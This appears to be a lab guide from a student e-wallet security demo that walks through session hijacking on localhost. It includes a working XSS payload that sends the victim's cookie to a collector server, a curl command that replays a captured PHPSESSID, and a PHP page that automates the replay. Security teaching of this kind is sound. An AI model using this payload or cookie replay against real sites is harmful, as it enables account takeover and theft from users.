# Session Hijacking Demo Lab

> **Warning:** This demo is for educational purposes only. Do not use these techniques on systems you do not own or have explicit permission to test.

---

## Step 1: Steal the Session Cookie (via XSS)

**Instructions:**

1. Start the data-stealing server:
   - Open a terminal and run:
     ```
     node SecurePay_E-Wallet_&_Cybersecurity_Demo_Lab/cyberlab/for_stole_data/server.js
     ```
2. In your browser, go to the XSS demo page:  
   `cyberlab/xss_demo.php`
3. Paste the following payload into the "Post a Comment" box and submit:

**Scenario:**  
An attacker injects a malicious script that silently sends the victim's session cookie to a server controlled by the attacker. This is a classic XSS attack used to hijack user sessions.

**Payload:**

```html
<script>
  const img = document.createElement("img");
  img.src = "http://localhost:3000/steal?session=" + document.cookie;
  document.body.appendChild(img);
</script>
```

**Explanation:**  
The script creates an image element with its `src` set to a URL containing the user's cookies. When the browser loads the image, it sends a request to the attacker's server with the session cookie in the URL. The attacker can then capture the cookie and use it to impersonate the victim.

---

## Step 2: Simulate Session Hijacking with curl

**Instructions:**

1. Copy the session ID (PHPSESSID) you received on your data-stealing server.
2. Open Command Prompt and run:
   ```sh
   curl -H "Cookie: PHPSESSID=YOUR_SESSION_ID" "http://localhost/Web_Tech_Project/SecurePay_E-Wallet_&_Cybersecurity_Demo_Lab/dashboard/index.php"
   ```
   - Replace `YOUR_SESSION_ID` with the actual session ID you captured.
3. If you see dashboard content, the session hijack was successful.

---

## Step 3: Verify in Browser (Automated via PHP)

**Instructions:**

1. Open your browser and go to:
   ```
   http://localhost/Web_Tech_Project/SecurePay_E-Wallet_&_Cybersecurity_Demo_Lab/cyberlab/for_stole_data/session_hijacking.php
   ```
2. This page (`session_hijacking.php`) performs the same session hijacking request as the curl command, but from the server side using PHP's cURL functions. It sends a request to the dashboard with the specified session ID and displays the result in your browser. This helps you visualize how an attacker could automate session hijacking using server-side scripts.

---

**Tips & Notes:**

- Ensure your local server is running.
- Use a valid session ID for the demonstration.
- For best results, use a private/incognito window for the victim and attacker sessions.
- Always clean up test accounts and sessions after your demo.
